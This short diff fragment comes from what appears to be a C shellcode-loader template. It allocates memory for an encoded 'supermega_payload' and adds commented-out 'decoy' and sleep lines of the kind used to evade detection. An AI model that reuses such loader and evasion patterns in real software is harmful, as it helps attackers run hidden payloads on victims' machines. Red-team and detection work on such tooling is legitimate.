@@ -29,9 +29,15 @@ int main()
 		return 6;
 	}
 
+	// Decoy
+	//WinExec("C:\\windows\\system32\\notepad.exe", 1);
+
 	// Allocate 1
     // char *dest = ...
     char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, p_RW);
+
+	// Wait a bit
+    //Sleep(2000);
 
 	// Copy (and decode)
 	// from: supermega_payload[]
